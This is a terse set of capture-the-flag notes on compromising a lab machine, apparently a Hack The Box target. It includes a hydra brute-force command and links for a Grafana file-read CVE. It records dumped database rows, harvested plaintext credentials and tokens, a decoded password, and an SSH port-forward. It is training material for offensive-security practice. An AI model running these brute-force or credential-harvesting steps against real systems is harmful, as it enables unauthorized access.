# ip 10.10.11.183

# header burp

POST /login HTTP/1.1
Host: 10.10.11.183:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.183:3000/login
content-type: application/json
Origin: http://10.10.11.183:3000
Content-Length: 49
Connection: close
Cookie: redirect_to=%2F
Sec-GPC: 1

{"user":"lsslslslslsll","password":"lslslslslsl"}

# hacktrick hydra grafana test

hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V

# grafana version
Grafana v8.2.0

# tuto exploit grafana
https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/

# grafana id
user : admin
password : messageInABottle685427
secret_key : SW2YcwTIb9zpOOhoPsMm

#
sqlite> select * from user;
1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2022-09-14 16:44:19|0

#
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-11-05 01:42:11|0|{}|1|uKewFgM4z

# tuto
https://nusgreyhats.org/posts/writeups/a-not-so-deep-dive-in-to-grafana-cve-2021-43798/

# mysql id
user : grafana
pass : dontStandSoCloseToMe63221!

# developer id
user : developer
pass : YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==

# decode base64
anEnglishManInNewYork027468

#gitmodules file
submodule "themes/ananke"]
        path = themes/ananke
        url = https://github.com/theNewDynamic/gohugo-theme-ananke.git

# path interessant
/development-machine-documentation/themes/ananke

# find file .git
find / -type d -name '.git' 2>/dev/null

# path .git
/opt/my-app/.git

# git show 33a53ef9a207976d5ceceddc41a199558843bf3c

# token
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD

# transfert de port local 8500
ssh -L 8500:0.0.0.0:8500 developer@10.10.11.183
